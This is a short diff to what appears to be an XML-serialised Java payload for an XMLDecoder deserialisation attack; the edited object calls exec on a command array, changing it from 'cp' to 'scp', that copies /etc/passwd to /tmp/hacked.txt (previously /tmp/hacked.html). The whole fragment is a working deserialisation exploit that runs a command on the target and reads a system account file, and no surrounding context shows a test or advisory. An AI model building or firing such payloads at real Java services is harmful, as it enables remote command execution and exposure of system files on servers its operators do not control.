@@ -42,13 +42,13 @@ project {
           <void method="exec">
           <array class="java.lang.String" length="3">
               <void index="0">
-                  <string>cp</string>
+                  <string>scp</string>
               </void>
               <void index="1">
                   <string>/etc/passwd</string>
               </void>
               <void index="2">
-                  <string>/tmp/hacked.html</string>
+                  <string>/tmp/hacked.txt</string>
               </void>
           </array>
           </void>
